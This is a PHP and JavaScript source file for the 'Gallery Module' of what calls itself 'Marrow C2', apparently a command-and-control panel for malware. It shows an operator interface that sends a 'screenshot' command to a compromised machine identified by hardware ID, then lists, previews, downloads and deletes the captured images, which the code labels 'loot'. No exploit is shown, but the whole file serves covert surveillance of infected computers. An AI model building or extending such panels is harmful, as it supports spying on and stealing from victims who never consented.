<?php
// Marrow C2 - Gallery Module
// Media gallery with lightbox preview
?>
<div id="gallery-container" class="h-full flex flex-col bg-[#030712]">
    <!-- Toolbar -->
    <div class="h-12 bg-[#0a0f1a] border-b border-[#1e2433] flex items-center justify-between px-4">
        <div class="flex items-center gap-4">
            <span class="text-white font-medium">🖼️ Media Gallery</span>
            <span id="gallery-count" class="text-xs text-gray-500">0 items</span>
        </div>
        <div class="flex items-center gap-2">
            <div class="flex items-center gap-1 bg-[#1a1f2e] rounded-lg p-1">
                <button onclick="GALLERY.setView('grid')" id="gallery-grid-btn"
                    class="px-3 py-1.5 rounded-md text-xs transition-colors gallery-view-active">Grid</button>
                <button onclick="GALLERY.setView('list')" id="gallery-list-btn"
                    class="px-3 py-1.5 rounded-md text-xs transition-colors">List</button>
            </div>
            <button onclick="GALLERY.refresh()"
                class="px-3 py-2 bg-[#1a1f2e] hover:bg-[#252b3d] rounded-lg text-sm text-gray-300">
                🔄 Refresh
            </button>
            <button onclick="queueCommand('screenshot')"
                class="px-3 py-2 bg-[#6366f1] hover:bg-[#5558e3] text-white rounded-lg text-sm">
                📸 Capture
            </button>
        </div>
    </div>

    <!-- Gallery Grid -->
    <div id="gallery-grid" class="flex-1 overflow-auto p-4">
        <div class="text-center text-gray-500 py-12">
            <div class="text-5xl mb-4 opacity-30">🖼️</div>
            <p class="mb-2">No media captured yet</p>
            <p class="text-xs">Click "Capture" to take a screenshot</p>
        </div>
    </div>
</div>

<!-- Lightbox -->
<div id="gallery-lightbox" class="fixed inset-0 bg-black/95 z-50 hidden flex items-center justify-center"
    onclick="GALLERY.closeLightbox()">
    <button onclick="GALLERY.closeLightbox()"
        class="absolute top-4 right-4 w-10 h-10 bg-[#1a1f2e] hover:bg-[#252b3d] rounded-full flex items-center justify-center text-white">✕</button>
    <button onclick="event.stopPropagation(); GALLERY.prev()"
        class="absolute left-4 top-1/2 -translate-y-1/2 w-12 h-12 bg-[#1a1f2e] hover:bg-[#252b3d] rounded-full flex items-center justify-center text-white text-xl">‹</button>
    <button onclick="event.stopPropagation(); GALLERY.next()"
        class="absolute right-4 top-1/2 -translate-y-1/2 w-12 h-12 bg-[#1a1f2e] hover:bg-[#252b3d] rounded-full flex items-center justify-center text-white text-xl">›</button>
    <img id="gallery-lightbox-img" src="" class="max-w-[90vw] max-h-[90vh] rounded-xl shadow-2xl"
        onclick="event.stopPropagation()">
    <div
        class="absolute bottom-4 left-1/2 -translate-x-1/2 flex items-center gap-4 bg-[#0a0f1a] border border-[#1e2433] rounded-xl px-4 py-2">
        <span id="gallery-lightbox-name" class="text-sm text-white"></span>
        <button onclick="event.stopPropagation(); GALLERY.download()"
            class="px-3 py-1 bg-[#6366f1] hover:bg-[#5558e3] rounded-lg text-xs text-white">📥 Download</button>
        <button onclick="event.stopPropagation(); GALLERY.delete()"
            class="px-3 py-1 bg-[#ef4444]/10 hover:bg-[#ef4444]/20 text-[#ef4444] rounded-lg text-xs">🗑️
            Delete</button>
    </div>
</div>

<style>
    .gallery-view-active {
        background: rgba(99, 102, 241, 0.2);
        color: white;
    }

    .gallery-item {
        transition: all 0.2s;
    }

    .gallery-item:hover {
        transform: scale(1.02);
        border-color: rgba(99, 102, 241, 0.5);
    }
</style>

<script>
    const GALLERY = {
        items: [],
        currentIndex: 0,
        view: 'grid',

        async refresh() {
            const grid = document.getElementById('gallery-grid');
            grid.innerHTML = '<div class="text-center py-12 text-gray-500"><div class="animate-spin text-3xl mb-4">⏳</div>Loading...</div>';

            try {
                const res = await fetch(`/api/dashboard.php?action=loot&hwid=${HWID}`).then(r => r.json());
                this.items = res;
                this.render();
            } catch (e) {
                grid.innerHTML = '<div class="text-center py-12 text-red-400">Failed to load media</div>';
            }
        },

        render() {
            const grid = document.getElementById('gallery-grid');
            document.getElementById('gallery-count').textContent = `${this.items.length} items`;

            if (this.items.length === 0) {
                grid.innerHTML = `
                <div class="text-center text-gray-500 py-12">
                    <div class="text-5xl mb-4 opacity-30">🖼️</div>
                    <p class="mb-2">No media captured yet</p>
                    <p class="text-xs">Click "Capture" to take a screenshot</p>
                </div>
            `;
                return;
            }

            if (this.view === 'grid') {
                grid.innerHTML = `
                <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5 gap-4">
                    ${this.items.map((item, i) => {
                    const isImage = /\.(png|jpg|jpeg|gif|webp)$/i.test(item.name);
                    return `
                            <div class="gallery-item bg-[#0f1219] rounded-xl border border-[#1e2433] overflow-hidden cursor-pointer group"
                                 onclick="GALLERY.openLightbox(${i})">
                                ${isImage ? `
                                    <div class="aspect-video bg-black">
                                        <img src="${item.url}" class="w-full h-full object-cover">
                                    </div>
                                ` : `
                                    <div class="aspect-video bg-[#1a1f2e] flex items-center justify-center text-4xl">📄</div>
                                `}
                                <div class="p-3">
                                    <div class="text-xs text-white truncate">${this.esc(item.name)}</div>
                                    <div class="text-[10px] text-gray-500 mt-1">${this.formatDate(item.name)}</div>
                                </div>
                            </div>
                        `;
                }).join('')}
                </div>
            `;
            } else {
                grid.innerHTML = `
                <div class="space-y-2">
                    ${this.items.map((item, i) => {
                    const isImage = /\.(png|jpg|jpeg|gif|webp)$/i.test(item.name);
                    return `
                            <div class="flex items-center gap-4 p-3 bg-[#0f1219] rounded-xl border border-[#1e2433] hover:border-[#6366f1]/50 cursor-pointer"
                                 onclick="GALLERY.openLightbox(${i})">
                                ${isImage ? `
                                    <div class="w-16 h-12 bg-black rounded-lg overflow-hidden flex-shrink-0">
                                        <img src="${item.url}" class="w-full h-full object-cover">
                                    </div>
                                ` : `
                                    <div class="w-16 h-12 bg-[#1a1f2e] rounded-lg flex items-center justify-center text-2xl flex-shrink-0">📄</div>
                                `}
                                <div class="flex-1 min-w-0">
                                    <div class="text-sm text-white truncate">${this.esc(item.name)}</div>
                                    <div class="text-xs text-gray-500">${this.formatDate(item.name)}</div>
                                </div>
                                <a href="${item.url}" download class="px-3 py-1.5 bg-[#1a1f2e] hover:bg-[#252b3d] rounded-lg text-xs text-gray-300" onclick="event.stopPropagation()">
                                    📥 Download
                                </a>
                            </div>
                        `;
                }).join('')}
                </div>
            `;
            }
        },

        setView(view) {
            this.view = view;
            document.getElementById('gallery-grid-btn').classList.remove('gallery-view-active');
            document.getElementById('gallery-list-btn').classList.remove('gallery-view-active');
            document.getElementById(`gallery-${view}-btn`).classList.add('gallery-view-active');
            this.render();
        },

        openLightbox(index) {
            this.currentIndex = index;
            const item = this.items[index];
            const isImage = /\.(png|jpg|jpeg|gif|webp)$/i.test(item.name);

            if (!isImage) {
                window.open(item.url, '_blank');
                return;
            }

            document.getElementById('gallery-lightbox-img').src = item.url;
            document.getElementById('gallery-lightbox-name').textContent = item.name;
            document.getElementById('gallery-lightbox').classList.remove('hidden');

            document.addEventListener('keydown', this.handleKey);
        },

        closeLightbox() {
            document.getElementById('gallery-lightbox').classList.add('hidden');
            document.removeEventListener('keydown', this.handleKey);
        },

        handleKey(e) {
            if (e.key === 'Escape') GALLERY.closeLightbox();
            if (e.key === 'ArrowLeft') GALLERY.prev();
            if (e.key === 'ArrowRight') GALLERY.next();
        },

        prev() {
            this.currentIndex = (this.currentIndex - 1 + this.items.length) % this.items.length;
            this.openLightbox(this.currentIndex);
        },

        next() {
            this.currentIndex = (this.currentIndex + 1) % this.items.length;
            this.openLightbox(this.currentIndex);
        },

        download() {
            const item = this.items[this.currentIndex];
            const a = document.createElement('a');
            a.href = item.url;
            a.download = item.name;
            a.click();
        },

        async delete() {
            const item = this.items[this.currentIndex];
            if (!confirm(`Delete ${item.name}?`)) return;

            const fd = new FormData();
            fd.append('action', 'delete_loot');
            fd.append('hwid', HWID);
            fd.append('file', item.name);

            try {
                await fetch('/api/dashboard.php', { method: 'POST', body: fd });
                this.closeLightbox();
                this.refresh();
            } catch (e) {
                alert('Failed to delete');
            }
        },

        formatDate(name) {
            // Try to extract date from filename like s_20231218145500.jpg
            const match = name.match(/(\d{4})(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/);
            if (match) {
                return `${match[1]}-${match[2]}-${match[3]} ${match[4]}:${match[5]}:${match[6]}`;
            }
            return 'Unknown date';
        },

        esc(s) {
            const d = document.createElement('div');
            d.textContent = s || '';
            return d.innerHTML;
        }
    };

    // Auto-refresh on load
    GALLERY.refresh();
</script>